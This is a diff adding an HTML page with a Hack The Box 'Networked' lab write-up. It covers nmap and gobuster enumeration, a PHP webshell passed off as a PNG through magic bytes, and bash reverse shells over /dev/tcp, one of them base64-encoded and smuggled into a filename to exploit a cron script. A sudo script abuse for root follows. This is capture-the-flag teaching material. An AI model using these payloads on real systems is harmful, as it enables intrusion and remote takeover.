@@ -1,0 +1,218 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">HTB Networked</h1>
+    <p class="text">Easy : User Difficulty 4.5</p>
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>└─$ <u>sudo nmap -p- -sCV &lt;target_ip&gt; --min-rate=2000</u>
+PORT    STATE  SERVICE VERSION
+22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
+|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
+|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
+80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16</code></pre></div>
+
+
+<p class="text">HTTP server is open on target machine. Nothing other interesting information.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/networked/1-home.png' %}" alt="">
+    <p class="text">Home page is not created yet. We need to enumerate other pages with gobuster.</p>
+</div>
+
+<div class="code-box"><pre><code>└─$ <u>gobsuter dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://target_ip -t 100</u>
+/.htaccess            (Status: 403) [Size: 211]
+/.hta                 (Status: 403) [Size: 206]
+/.htpasswd            (Status: 403) [Size: 211]
+/backup               (Status: 301) [Size: 237] [-> http://10.129.112.209/backup/]
+/cgi-bin/             (Status: 403) [Size: 210]
+/index.php            (Status: 200) [Size: 229]
+/uploads              (Status: 301) [Size: 238] [-> http://10.129.112.209/uploads/]</code></pre></div>
+
+<p class="text">We can visit backup page, which should include webpage source codes. Ahead to http://target_ip/backup and download file. Then, unzip it.</p>
+
+<div class="code-box"><pre><code>└─$ tar -xf backup.tar </code></pre></div>
+
+<p class="text">3 files are unzipped. index.php holds just texts, so let's analyze lib.php, upload.php and photos.php.</p>
+
+<p class="text">First, upload page checks file type with a function 'check_file_type' and the size of the file.</p>
+
+<div class="code-box"><pre><code>  10   │     if (!(check_file_type($_FILES["myFile"]) && filesize($_FILES['myFile']['tmp_name']) < 60000)) {
+  11   │       echo '<pre>Invalid image file.</pre>';
+  12   │       displayform();
+  13   │     }</code></pre></div>
+
+<p class="text">The funciton check_file_type is from lib.php, so let's take look at the lib file next.</p>
+
+<div class="code-box"><pre><code>  57   │ function check_file_type($file) {
+  58   │   $mime_type = file_mime_type($file);
+  59   │   if (strpos($mime_type, 'image/') === 0) {
+  60   │       return true;
+  61   │   } else {
+  62   │       return false;
+  63   │   }  
+  64   │ }</code></pre></div>
+
+<p class="text">This function also calls other function <u>file_mime_type</u> and <u>strpos</u>. It checks if the mime type of POSTED file is image/ . If it is image file, returns true.</p>
+
+<p class="text">The functionality of these files are easy, but the sanitization and validation are tight. We cannot upload file with size over 60000 and any file extension except for image file. </p>
+
+<p class="text">However, it doesn't check other stuff. So if we could falsify mime type, it's possible to upload php webshell.</p>
+<p class="text">Linux (and most systems) determine file type based on the file's content — especially the first few bytes, called the magic number — not the file extension. Therefore, if we append prefix of PNG file to a php file, our machine determine the php file as PNG file mistakenly. Let's do that.</p>
+
+<div class="code-box"><pre><code>└─$ nano shell.php.png
+<u class="green">&lt;?php
+system($_REQUEST['cmd']);
+?></u>
+
+└─$ echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r >> mime_shell.php.png</code></pre></div>
+
+<p class="text">Then, you can upload this file with http://target_ip/upload.php. After uploading, you can find the file in http://target_up/phptos.php. Find uploaded file name. Afterward, send request with reverse shell code.</p>
+
+<div class="code-box"><pre><code>└─$ curl -G --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.51/4444 0>&1"' http://10.129.112.209/uploads/10_10_14_51.php.png <u class="green">Replace png file name with yours.</u></code></pre></div>
+
+<div class="code-box"><pre><code>└─$ nc -lvnp 4444
+connect to [10.10.14.51] from (UNKNOWN) [10.129.112.209] 53258
+bash: no job control in this shell
+bash-4.2$ </code></pre></div>
+
+<p class="text">You'll get reverse shell.</p>
+
+
+<h2 class="subtitle">Lateral Movement</h2>
+
+<p class="text">We can find interesting information in /home/guly directory. </p>
+<div class="code-box">bash-4.2$ cd /home/guly 
+bash-4.2$ ls
+check_attack.php  crontab.guly  user.txt</div>
+<div class="code-box"><pre><code>bash-4.2$ cat crontab.guly
+*/3 * * * * php /home/guly/check_attack.php</code></pre></div>
+<p class="text">There is a crontab which run php file. Let's take a look at the source code.</p>
+
+<div class="code-box"><pre><code>&lt;?php
+require '/var/www/html/lib.php';
+$path = '/var/www/html/uploads/';
+$logpath = '/tmp/attack.log';
+$to = 'guly';
+$msg= '';
+$headers = "X-Mailer: check_attack.php\r\n";
+
+$files = array();
+<u>$files = preg_grep('/^([^.])/', scandir($path));</u>         <u class="green">Enumerate files under ../uploads/ and ignore files like .htpasswd</u>
+
+foreach ($files as $key => $value) {
+        $msg='';
+  if ($value == 'index.html') {             <u class="green"># skips index.html</u>
+        continue;
+  }
+  #echo "-------------\n";
+
+  #print "check: $value\n";
+  list ($name,$ext) = <u>getnameCheck($value);</u>
+  $check = check_ip($name,$value);
+
+  if (!($check[0])) {
+    echo "attack!\n";
+    # todo: attach file
+    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);
+
+    exec("rm -f $logpath");
+    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
+    echo "rm -f $path$value\n";
+    mail($to, $msg, $msg, $headers, "-F$value");
+  }
+}
+?></code></pre></div>
+
+
+<div class="code-box"><pre><code>   3   │ function <u>getnameCheck($filename)</u> {
+   4   │   $pieces = explode('.',$filename);
+   5   │   $name= array_shift($pieces);
+   6   │   $name = str_replace('_','.',$name);          
+   7   │   $ext = implode('.',$pieces);
+   8   │   #echo "name $name - ext $ext\n";
+   9   │   return array($name,$ext);
+  10   │ }
+</code></pre></div>
+]
+
+<p class="text">We can exploit this file because there is no file name sanitization and we can control $value parameter.</p>
+
+<p class="text">If we can name file like ';bash -i >& /dev/tcp/10.10.14.51/4444 0>&1', this file execute <u>nohup /bin/rm -f $path;bash -i >& /dev/tcp/10.10.14.51/4444 0>&1</u>. But we cannot use / and other special characters, so we need to use base64 to execute this command without error.</p>
+
+<div class="code-box"><pre><code>└─$ echo -n 'bash -c "bash -i >& /dev/tcp/10.10.14.51/4444 0>&1"' | base64 <u class="green"># On your machine.</u>
+YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41MS80NDQ0IDA+JjEi
+
+
+bash-4.2$ cd /var/www/html/uploads
+bash-4.2$ touch -- ';echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41MS80NDQ0IDA+JjEi | base64 -d | bash' 
+<u class="green"># on the target machine</u></code></pre></div>
+
+<p class="text">After a few minutes, we get reverse shell. <u class="green">Don't forget to open your port with nc to get reverse shell.</u></p>
+
+
+<h2 class="subtitle">PrivEsc</h2>
+
+<div class="code-box"><pre><code>[guly@networked ~]$ sudo -l
+sudo -l
+Matching Defaults entries for guly on networked:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
+    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
+    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
+    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
+    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
+    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
+    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User guly may run the following commands on networked:
+    (root) NOPASSWD: <u>/usr/local/sbin/changename.sh</u></code></pre></div>
+
+
+<p class="text">This user has a privilege to run changename.sh as root. Let's analyze this if we can use it for privilege escalation.</p>
+
+
+<div class="code-box"><pre><code>#!/bin/bash -p         <u class="green">#-p tells Bash to not drop privileges if the script was setuid root.</u>
+cat > /etc/sysconfig/network-scripts/ifcfg-guly &lt;&lt; EoF
+DEVICE=guly0
+ONBOOT=no
+NM_CONTROLLED=no
+EoF
+
+regexp="^[a-zA-Z0-9_\ /-]+$"                <u class="green"># For input sanitization.</u>
+
+for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
+        echo "interface $var:"
+        read x
+        while [[ ! $x =~ $regexp ]]; do
+                echo "wrong input, try again"
+                echo "interface $var:"
+                read x                      <u class="green"># here is user input.</u>
+        done
+        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
+done
+  
+/sbin/ifup guly0</code></pre></div>
+
+<div class="code-box"><pre><code><u class="green">If we input abc /bin/bash at some timing...</u>
+BOOTPROTO=abc /bin/bash
+<u class="green">Then...</u>
+/sbin/ifup guly0 <u class="green">will be executed</u>
+
+
+id
+uid=0(root) gid=0(root) groups=0(root)</code></pre></div>
+
+<p class="text">You can get root shell.</p>
+
+</body>
+</html>
